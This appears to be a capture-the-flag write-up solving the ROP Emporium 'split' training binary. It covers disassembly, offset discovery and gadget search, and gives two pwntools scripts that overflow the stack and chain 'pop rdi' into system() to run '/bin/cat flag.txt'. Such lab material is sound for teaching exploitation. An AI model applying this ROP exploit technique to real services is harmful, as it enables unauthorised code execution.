# 2. split

File

```python
wayell@ubuntu:~/Desktop/ROPEmporium/2.split$ file split
split: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=98755e64e1d0c1bff48fccae1dca9ee9e3c609e2, not stripped
```

Normal execution

```python
wayell@ubuntu:~/Desktop/ROPEmporium/2.split$ ./split
split by ROP Emporium
x86_64

Contriving a reason to ask user for data...
> hello friend
Thank you!

Exiting
```

Strings

```python
wayell@ubuntu:~/Desktop/ROPEmporium/2.split$ strings split
/lib64/ld-linux-x86-64.so.2
libc.so.6
puts
printf
memset
read
stdout
system
setvbuf
__libc_start_main
GLIBC_2.2.5
__gmon_start__
AWAVI
AUATL
[]A\A]A^A_
split by ROP Emporium
x86_64
Exiting
Contriving a reason to ask user for data...
Thank you!
/bin/ls
;*3$"
/bin/cat flag.txt
GCC: (Ubuntu 7.5.0-3ubuntu1~18.04) 7.5.0
crtstuff.c
deregister_tm_clones
__do_global_dtors_aux
completed.7698
__do_global_dtors_aux_fini_array_entry
frame_dummy
__frame_dummy_init_array_entry
split.c
pwnme
usefulFunction
__FRAME_END__
__init_array_end
_DYNAMIC
__init_array_start
__GNU_EH_FRAME_HDR
_GLOBAL_OFFSET_TABLE_
__libc_csu_fini
stdout@@GLIBC_2.2.5
puts@@GLIBC_2.2.5
_edata
system@@GLIBC_2.2.5
printf@@GLIBC_2.2.5
memset@@GLIBC_2.2.5
read@@GLIBC_2.2.5
__libc_start_main@@GLIBC_2.2.5
__data_start
__gmon_start__
__dso_handle
_IO_stdin_used
usefulString
__libc_csu_init
_dl_relocate_static_pie
__bss_start
main
setvbuf@@GLIBC_2.2.5
__TMC_END__
.symtab
.strtab
.shstrtab
.interp
.note.ABI-tag
.note.gnu.build-id
.gnu.hash
.dynsym
.dynstr
.gnu.version
.gnu.version_r
.rela.dyn
.rela.plt
.init
.text
.fini
.rodata
.eh_frame_hdr
.eh_frame
.init_array
.fini_array
.dynamic
.got
.got.plt
.data
.bss
.comment
```

Function names

```python
wayell@ubuntu:~/Desktop/ROPEmporium/2.split$ nm split|grep ' t '
00000000004005f0 t deregister_tm_clones
0000000000400660 t __do_global_dtors_aux
0000000000400690 t frame_dummy
00000000004006e8 t pwnme
0000000000400620 t register_tm_clones
0000000000400742 t usefulFunction
```

checksec, functions

```python
gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : Partial

gdb-peda$ info functions
All defined functions:

Non-debugging symbols:
0x0000000000400528  _init
0x0000000000400550  puts@plt
0x0000000000400560  system@plt
0x0000000000400570  printf@plt
0x0000000000400580  memset@plt
0x0000000000400590  read@plt
0x00000000004005a0  setvbuf@plt
0x00000000004005b0  _start
0x00000000004005e0  _dl_relocate_static_pie
0x00000000004005f0  deregister_tm_clones
0x0000000000400620  register_tm_clones
0x0000000000400660  __do_global_dtors_aux
0x0000000000400690  frame_dummy
0x0000000000400697  main
0x00000000004006e8  pwnme
0x0000000000400742  usefulFunction
0x0000000000400760  __libc_csu_init
0x00000000004007d0  __libc_csu_fini
0x00000000004007d4  _fini
```

We can check for strings using rabin2 (from r2)

```python
wayell@ubuntu:~/Desktop/ROPEmporium/2.split$ rabin2 -z split
[Strings]
nth paddr      vaddr      len size section type  string
―――――――――――――――――――――――――――――――――――――――――――――――――――――――
0   0x000007e8 0x004007e8 21  22   .rodata ascii split by ROP Emporium
1   0x000007fe 0x004007fe 7   8    .rodata ascii x86_64\n
2   0x00000806 0x00400806 8   9    .rodata ascii \nExiting
3   0x00000810 0x00400810 43  44   .rodata ascii Contriving a reason to ask user for data...
4   0x0000083f 0x0040083f 10  11   .rodata ascii Thank you!
5   0x0000084a 0x0040084a 7   8    .rodata ascii /bin/ls
0   0x00001060 0x00601060 17  18   .data   ascii /bin/cat flag.txt
```

disassembly of main

some puts, calls pwnme

```python
gdb-peda$ disas main
Dump of assembler code for function main:
   0x0000000000400697 <+0>:	push   rbp
   0x0000000000400698 <+1>:	mov    rbp,rsp
   0x000000000040069b <+4>:	mov    rax,QWORD PTR [rip+0x2009d6]        # 0x601078 <stdout@@GLIBC_2.2.5>
   0x00000000004006a2 <+11>:	mov    ecx,0x0
   0x00000000004006a7 <+16>:	mov    edx,0x2
   0x00000000004006ac <+21>:	mov    esi,0x0
   0x00000000004006b1 <+26>:	mov    rdi,rax
   0x00000000004006b4 <+29>:	call   0x4005a0 <setvbuf@plt>
   0x00000000004006b9 <+34>:	mov    edi,0x4007e8
   0x00000000004006be <+39>:	call   0x400550 <puts@plt>
   0x00000000004006c3 <+44>:	mov    edi,0x4007fe
   0x00000000004006c8 <+49>:	call   0x400550 <puts@plt>
   0x00000000004006cd <+54>:	mov    eax,0x0
   0x00000000004006d2 <+59>:	call   0x4006e8 <pwnme>
   0x00000000004006d7 <+64>:	mov    edi,0x400806
   0x00000000004006dc <+69>:	call   0x400550 <puts@plt>
   0x00000000004006e1 <+74>:	mov    eax,0x0
   0x00000000004006e6 <+79>:	pop    rbp
   0x00000000004006e7 <+80>:	ret    
End of assembler dump.
```

pwnme disassembly

Some puts, memset 32 bytes, read 0x60 bytes

```python
gdb-peda$ disas pwnme
Dump of assembler code for function pwnme:
   0x00000000004006e8 <+0>:	push   rbp
   0x00000000004006e9 <+1>:	mov    rbp,rsp
   0x00000000004006ec <+4>:	sub    rsp,0x20
   0x00000000004006f0 <+8>:	lea    rax,[rbp-0x20]
   0x00000000004006f4 <+12>:	mov    edx,0x20
   0x00000000004006f9 <+17>:	mov    esi,0x0
   0x00000000004006fe <+22>:	mov    rdi,rax
   0x0000000000400701 <+25>:	call   0x400580 <memset@plt>
   0x0000000000400706 <+30>:	mov    edi,0x400810
   0x000000000040070b <+35>:	call   0x400550 <puts@plt>
   0x0000000000400710 <+40>:	mov    edi,0x40083c
   0x0000000000400715 <+45>:	mov    eax,0x0
   0x000000000040071a <+50>:	call   0x400570 <printf@plt>
   0x000000000040071f <+55>:	lea    rax,[rbp-0x20]
   0x0000000000400723 <+59>:	mov    edx,0x60
   0x0000000000400728 <+64>:	mov    rsi,rax
   0x000000000040072b <+67>:	mov    edi,0x0
   0x0000000000400730 <+72>:	call   0x400590 <read@plt>
   0x0000000000400735 <+77>:	mov    edi,0x40083f
   0x000000000040073a <+82>:	call   0x400550 <puts@plt>
   0x000000000040073f <+87>:	nop
   0x0000000000400740 <+88>:	leave  
   0x0000000000400741 <+89>:	ret    
End of assembler dump.
```

usefulFunction disassembly

system call

before system call there is some sort of memory address moved to edi (RDI register will hold the string value passed to system)

```python
gdb-peda$ disas usefulFunction
Dump of assembler code for function usefulFunction:
   0x0000000000400742 <+0>:	push   rbp
   0x0000000000400743 <+1>:	mov    rbp,rsp
   0x0000000000400746 <+4>:	mov    edi,0x40084a
   0x000000000040074b <+9>:	call   0x400560 <system@plt>
   0x0000000000400750 <+14>:	nop
   0x0000000000400751 <+15>:	pop    rbp
   0x0000000000400752 <+16>:	ret    
End of assembler dump.
```

Generate cyclic, get offset

```python
pwndbg> cyclic 100
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
pwndbg> r
Starting program: /home/wayell/Desktop/ROPEmporium/2.split/split 
split by ROP Emporium
x86_64

Contriving a reason to ask user for data...
> aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
Thank you!

Program received signal SIGSEGV, Segmentation fault.
0x0000000000400741 in pwnme ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
───────────────────────────────────────────────────────────────────────────────────────────────[ REGISTERS ]───────────────────────────────────────────────────────────────────────────────────────────────
 RAX  0xb
 RBX  0x400760 (__libc_csu_init) ◂— push   r15
 RCX  0x7ffff7ed11e7 (write+23) ◂— cmp    rax, -0x1000 /* 'H=' */
 RDX  0x0
 RDI  0x7ffff7fae4c0 (_IO_stdfile_1_lock) ◂— 0x0
 RSI  0x7ffff7fac723 (_IO_2_1_stdout_+131) ◂— 0xfae4c0000000000a /* '\n' */
 R8   0xb
 R9   0x2
 R10  0xfffffffffffff27a
 R11  0x246
 R12  0x4005b0 (_start) ◂— xor    ebp, ebp
 R13  0x7fffffffe080 ◂— 0x1
 R14  0x0
 R15  0x0
 RBP  0x6161616a61616169 ('iaaajaaa')
 RSP  0x7fffffffdf88 ◂— 0x6161616c6161616b ('kaaalaaa')
 RIP  0x400741 (pwnme+89) ◂— ret    
────────────────────────────────────────────────────────────────────────────────────────────────[ DISASM ]─────────────────────────────────────────────────────────────────────────────────────────────────
 ► 0x400741 <pwnme+89>    ret    <0x6161616c6161616b>

─────────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]─────────────────────────────────────────────────────────────────────────────────────────────────
00:0000│ rsp 0x7fffffffdf88 ◂— 0x6161616c6161616b ('kaaalaaa')
01:0008│     0x7fffffffdf90 ◂— 0x6161616e6161616d ('maaanaaa')
02:0010│     0x7fffffffdf98 ◂— 0x616161706161616f ('oaaapaaa')
03:0018│     0x7fffffffdfa0 ◂— 0x6161617261616171 ('qaaaraaa')
04:0020│     0x7fffffffdfa8 ◂— 0x6161617461616173 ('saaataaa')
05:0028│     0x7fffffffdfb0 ◂— 0x6161617661616175 ('uaaavaaa')
06:0030│     0x7fffffffdfb8 ◂— 0x6161617861616177 ('waaaxaaa')
07:0038│     0x7fffffffdfc0 —▸ 0x400760 (__libc_csu_init) ◂— push   r15
───────────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]───────────────────────────────────────────────────────────────────────────────────────────────
 ► f 0         0x400741 pwnme+89
   f 1 0x6161616c6161616b
   f 2 0x6161616e6161616d
   f 3 0x616161706161616f
   f 4 0x6161617261616171
   f 5 0x6161617461616173
   f 6 0x6161617661616175
   f 7 0x6161617861616177
```

Offset is at 40

```python
pwndbg> x/wx $rsp
0x7fffffffdf88:	0x6161616b
pwndbg> cyclic -l 0x6161616b
40
```

We can search for the /bin/cat function since there was a hint in the challenge page

```python
pwndbg> p system
$1 = {int (const char *)} 0x7ffff7e15410 <__libc_system>
pwndbg> search '/bin/cat'
split           0x601060 '/bin/cat flag.txt'
```

Currently when we call usefulFunction, the value passed to system is "/bin/ls".  (based on RDI value)

```python
pwndbg> search '/bin/ls'
split           0x40084a 0x736c2f6e69622f /* '/bin/ls' */
split           0x60084a 0x736c2f6e69622f /* '/bin/ls' */
pwndbg> search '/bin/cat'
split           0x601060 '/bin/cat flag.txt'
pwndbg> disassemble usefulFunction 
Dump of assembler code for function usefulFunction:
   0x0000000000400742 <+0>:	push   rbp
   0x0000000000400743 <+1>:	mov    rbp,rsp
   0x0000000000400746 <+4>:	mov    edi,0x40084a
   0x000000000040074b <+9>:	call   0x400560 <system@plt>
   0x0000000000400750 <+14>:	nop
   0x0000000000400751 <+15>:	pop    rbp
   0x0000000000400752 <+16>:	ret    
End of assembler dump.
```

When we overwrite our RIP with the address of system, this RDI value needs to be changed to point to "/bin/cat flag.txt" instead.

How can we achieve this? We can look for instructions that already exists in the applications to pop values from the stack to the RDI register.

We need to use a tool to identify rop gadgets such as Ropper.

To list all gadgets:

```python
wayell@ubuntu:~/Desktop/ROPEmporium/2.split$ ropper -f split
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%

Gadgets
=======

0x000000000040060e: adc byte ptr [rax], ah; jmp rax; 
0x00000000004005df: add bl, dh; ret; 
0x0000000000400532: add byte ptr [rax - 0x7b], cl; sal byte ptr [rdx + rax - 1], 0xd0; add rsp, 8; ret; 
0x00000000004007cd: add byte ptr [rax], al; add bl, dh; ret; 
0x00000000004007cb: add byte ptr [rax], al; add byte ptr [rax], al; add bl, dh; ret; 
0x00000000004006e2: add byte ptr [rax], al; add byte ptr [rax], al; pop rbp; ret; 
0x00000000004006d4: add byte ptr [rax], al; add byte ptr [rdi + 0x400806], bh; call 0x550; mov eax, 0; pop rbp; ret; 
0x00000000004006d5: add byte ptr [rax], al; mov edi, 0x400806; call 0x550; mov eax, 0; pop rbp; ret; 
0x0000000000400616: add byte ptr [rax], al; pop rbp; ret; 
0x00000000004007d2: add byte ptr [rax], al; sub rsp, 8; add rsp, 8; ret; 
0x0000000000400604: add byte ptr [rax], al; test rax, rax; je 0x618; pop rbp; mov edi, 0x601078; jmp rax; 
0x0000000000400646: add byte ptr [rax], al; test rax, rax; je 0x658; pop rbp; mov edi, 0x601078; jmp rax; 
0x0000000000400615: add byte ptr [rax], r8b; pop rbp; ret; 
0x0000000000400677: add byte ptr [rcx], al; pop rbp; ret; 
0x00000000004006d6: add byte ptr [rdi + 0x400806], bh; call 0x550; mov eax, 0; pop rbp; ret; 
0x000000000040052e: add eax, 0x200ac5; test rax, rax; je 0x53a; call rax; 
0x000000000040052e: add eax, 0x200ac5; test rax, rax; je 0x53a; call rax; add rsp, 8; ret; 
0x000000000040053b: add esp, 8; ret; 
0x000000000040053a: add rsp, 8; ret; 
0x0000000000400531: and byte ptr [rax], al; test rax, rax; je 0x53a; call rax; 
0x0000000000400531: and byte ptr [rax], al; test rax, rax; je 0x53a; call rax; add rsp, 8; ret; 
0x00000000004006dc: call 0x550; mov eax, 0; pop rbp; ret; 
0x000000000040073a: call 0x550; nop; leave; ret; 
0x000000000040074b: call 0x560; nop; pop rbp; ret; 
0x0000000000400730: call 0x590; mov edi, 0x40083f; call 0x550; nop; leave; ret; 
0x000000000040066d: call 0x5f0; mov byte ptr [rip + 0x200a07], 1; pop rbp; ret; 
0x000000000040096b: call qword ptr [rcx]; 
0x0000000000400538: call rax; 
0x0000000000400538: call rax; add rsp, 8; ret; 
0x00000000004007ac: fmul qword ptr [rax - 0x7d]; ret; 
0x000000000040052a: in al, dx; or byte ptr [rax - 0x75], cl; add eax, 0x200ac5; test rax, rax; je 0x53a; call rax; 
0x0000000000400745: in eax, 0xbf; or byte ptr [rax], al; call 0x560; nop; pop rbp; ret; 
0x0000000000400536: je 0x53a; call rax; 
0x0000000000400536: je 0x53a; call rax; add rsp, 8; ret; 
0x0000000000400609: je 0x618; pop rbp; mov edi, 0x601078; jmp rax; 
0x000000000040064b: je 0x658; pop rbp; mov edi, 0x601078; jmp rax; 
0x000000000040098b: jmp qword ptr [rbp]; 
0x0000000000400611: jmp rax; 
0x0000000000400672: mov byte ptr [rip + 0x200a07], 1; pop rbp; ret; 
0x00000000004006e1: mov eax, 0; pop rbp; ret; 
0x000000000040052d: mov eax, dword ptr [rip + 0x200ac5]; test rax, rax; je 0x53a; call rax; 
0x000000000040052d: mov eax, dword ptr [rip + 0x200ac5]; test rax, rax; je 0x53a; call rax; add rsp, 8; ret; 
0x000000000040066b: mov ebp, esp; call 0x5f0; mov byte ptr [rip + 0x200a07], 1; pop rbp; ret; 
0x0000000000400744: mov ebp, esp; mov edi, 0x40084a; call 0x560; nop; pop rbp; ret; 
0x00000000004006d7: mov edi, 0x400806; call 0x550; mov eax, 0; pop rbp; ret; 
0x0000000000400735: mov edi, 0x40083f; call 0x550; nop; leave; ret; 
0x0000000000400746: mov edi, 0x40084a; call 0x560; nop; pop rbp; ret; 
0x000000000040060c: mov edi, 0x601078; jmp rax; 
0x000000000040052c: mov rax, qword ptr [rip + 0x200ac5]; test rax, rax; je 0x53a; call rax; 
0x000000000040052c: mov rax, qword ptr [rip + 0x200ac5]; test rax, rax; je 0x53a; call rax; add rsp, 8; ret; 
0x000000000040066a: mov rbp, rsp; call 0x5f0; mov byte ptr [rip + 0x200a07], 1; pop rbp; ret; 
0x0000000000400743: mov rbp, rsp; mov edi, 0x40084a; call 0x560; nop; pop rbp; ret; 
0x0000000000400613: nop dword ptr [rax + rax]; pop rbp; ret; 
0x0000000000400655: nop dword ptr [rax]; pop rbp; ret; 
0x0000000000400530: or ah, byte ptr [rax]; add byte ptr [rax - 0x7b], cl; sal byte ptr [rdx + rax - 1], 0xd0; add rsp, 8; ret; 
0x0000000000400675: or ah, byte ptr [rax]; add byte ptr [rcx], al; pop rbp; ret; 
0x000000000040052b: or byte ptr [rax - 0x75], cl; add eax, 0x200ac5; test rax, rax; je 0x53a; call rax; 
0x00000000004006d9: or byte ptr [rax], al; call 0x550; mov eax, 0; pop rbp; ret; 
0x0000000000400737: or byte ptr [rax], al; call 0x550; nop; leave; ret; 
0x0000000000400748: or byte ptr [rax], al; call 0x560; nop; pop rbp; ret; 
0x00000000004007bc: pop r12; pop r13; pop r14; pop r15; ret; 
0x00000000004007be: pop r13; pop r14; pop r15; ret; 
0x00000000004007c0: pop r14; pop r15; ret; 
0x00000000004007c2: pop r15; ret; 
0x000000000040060b: pop rbp; mov edi, 0x601078; jmp rax; 
0x00000000004007bb: pop rbp; pop r12; pop r13; pop r14; pop r15; ret; 
0x00000000004007bf: pop rbp; pop r14; pop r15; ret; 
0x0000000000400618: pop rbp; ret; 
0x00000000004007c3: pop rdi; ret; 
0x00000000004007c1: pop rsi; pop r15; ret; 
0x00000000004007bd: pop rsp; pop r13; pop r14; pop r15; ret; 
0x0000000000400669: push rbp; mov rbp, rsp; call 0x5f0; mov byte ptr [rip + 0x200a07], 1; pop rbp; ret; 
0x0000000000400542: ret 0x200a; 
0x0000000000400535: sal byte ptr [rdx + rax - 1], 0xd0; add rsp, 8; ret; 
0x00000000004007d5: sub esp, 8; add rsp, 8; ret; 
0x0000000000400529: sub esp, 8; mov rax, qword ptr [rip + 0x200ac5]; test rax, rax; je 0x53a; call rax; 
0x00000000004007d4: sub rsp, 8; add rsp, 8; ret; 
0x0000000000400528: sub rsp, 8; mov rax, qword ptr [rip + 0x200ac5]; test rax, rax; je 0x53a; call rax; 
0x0000000000400534: test eax, eax; je 0x53a; call rax; 
0x0000000000400534: test eax, eax; je 0x53a; call rax; add rsp, 8; ret; 
0x0000000000400607: test eax, eax; je 0x618; pop rbp; mov edi, 0x601078; jmp rax; 
0x0000000000400649: test eax, eax; je 0x658; pop rbp; mov edi, 0x601078; jmp rax; 
0x0000000000400533: test rax, rax; je 0x53a; call rax; 
0x0000000000400533: test rax, rax; je 0x53a; call rax; add rsp, 8; ret; 
0x0000000000400606: test rax, rax; je 0x618; pop rbp; mov edi, 0x601078; jmp rax; 
0x0000000000400648: test rax, rax; je 0x658; pop rbp; mov edi, 0x601078; jmp rax; 
0x0000000000400740: leave; ret; 
0x0000000000400750: nop; pop rbp; ret; 
0x000000000040073f: nop; leave; ret; 
0x000000000040053e: ret; 

90 gadgets found
```

We need to first pop the current RDI value before we can insert the value we want. To do this, we can search for pop rdi functions with ropper

WHY POP RDI? The pop instruction will place the next value on the stack into the referenced register, which in this case is rdi. So after we pop rdi and want to place "/bin/cat flag.txt" on it, we need to pass the address of our parameter after the pop rdi function.

```python
wayell@ubuntu:~/Desktop/ROPEmporium/2.split$ ropper -f split --search "pop rdi"
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop rdi

[INFO] File: split
0x00000000004007c3: pop rdi; ret;
```

To solve, we can use pwntools

Two solvers, one using hardcoded addresses for rop chain, and another using rop.chain() function

Solver 1

```python
from pwn import *

# Set up pwntools to work with this binary
elf = context.binary = ELF('split')
p = process()

# Number of padding bytes (to offset RIP)
padding = 40

# Crafting payload, contains x nops of padding, ret, rop chain
payload = flat(
	asm('nop') * padding,
	next(elf.search(asm('ret'))),
	elf.symbols['usefulFunction'],
	p64(0x00000000004007c3), # pop rdi, ret
	p64(0x601060), # /bin/cat flag.txt
	p64(0x000000000040074b), # system
)

# Writing payload to file on same directory
f = open("payload", "wb")
f.write(payload)

# Send payload after asked for input
p.sendlineafter(">", payload)

p.interactive()
```

Solver 2

```python
from pwn import *

# Set up pwntools to work with this binary
elf = context.binary = ELF('split')
p = process()

# Number of padding bytes (to offset RIP)
padding = 40

# Load ROP gadgets
rop = ROP(elf)
rop.system(next(elf.search(b'/bin/cat')))

# Print the ROP chain
pprint(rop.gadgets)
print(rop.dump())

# Crafting payload, contains x nops of padding, ret, rop chain
payload = flat(
	asm('nop') * padding,
	next(elf.search(asm('ret'))),
	rop.chain(),
)

# Writing payload to file on same directory
f = open("payload", "wb")
f.write(payload)

# Send payload after asked for input
p.sendlineafter(">", payload)

p.interactive()
```

For solver2 we can see the rop chain used by pwntools printed out for us.

```python
wayell@ubuntu:~/Desktop/ROPEmporium/2.split$ python3 solve2.py 
[*] '/home/wayell/Desktop/ROPEmporium/2.split/split'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Starting local process '/home/wayell/Desktop/ROPEmporium/2.split/split': pid 7376
[*] Loaded 14 cached gadgets for 'split'
{4195642: Gadget(0x40053a, ['add rsp, 8', 'ret'], [], 0x10),
 4195643: Gadget(0x40053b, ['add esp, 8', 'ret'], [], 0x10),
 4195646: Gadget(0x40053e, ['ret'], [], 0x8),
 4195864: Gadget(0x400618, ['pop rbp', 'ret'], ['rbp'], 0x10),
 4196160: Gadget(0x400740, ['leave', 'ret'], ['rbp', 'rsp'], 0x2540be407),
 4196283: Gadget(0x4007bb, ['pop rbp', 'pop r12', 'pop r13', 'pop r14', 'pop r15', 'ret'], ['rbp', 'r12', 'r13', 'r14', 'r15'], 0x30),
 4196284: Gadget(0x4007bc, ['pop r12', 'pop r13', 'pop r14', 'pop r15', 'ret'], ['r12', 'r13', 'r14', 'r15'], 0x28),
 4196285: Gadget(0x4007bd, ['pop rsp', 'pop r13', 'pop r14', 'pop r15', 'ret'], ['rsp', 'r13', 'r14', 'r15'], 0x28),
 4196286: Gadget(0x4007be, ['pop r13', 'pop r14', 'pop r15', 'ret'], ['r13', 'r14', 'r15'], 0x20),
 4196287: Gadget(0x4007bf, ['pop rbp', 'pop r14', 'pop r15', 'ret'], ['rbp', 'r14', 'r15'], 0x20),
 4196288: Gadget(0x4007c0, ['pop r14', 'pop r15', 'ret'], ['r14', 'r15'], 0x18),
 4196289: Gadget(0x4007c1, ['pop rsi', 'pop r15', 'ret'], ['rsi', 'r15'], 0x18),
 4196290: Gadget(0x4007c2, ['pop r15', 'ret'], ['r15'], 0x10),
 4196291: Gadget(0x4007c3, ['pop rdi', 'ret'], ['rdi'], 0x10)}
0x0000:         0x4007c3 pop rdi; ret
0x0008:         0x601060 [arg0] rdi = usefulString
0x0010:         0x400560 system
/home/wayell/.local/lib/python3.8/site-packages/pwnlib/tubes/tube.py:822: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  res = self.recvuntil(delim, timeout=timeout)
[*] Switching to interactive mode
 Thank you!
ROPE{a_placeholder_32byte_flag!}
```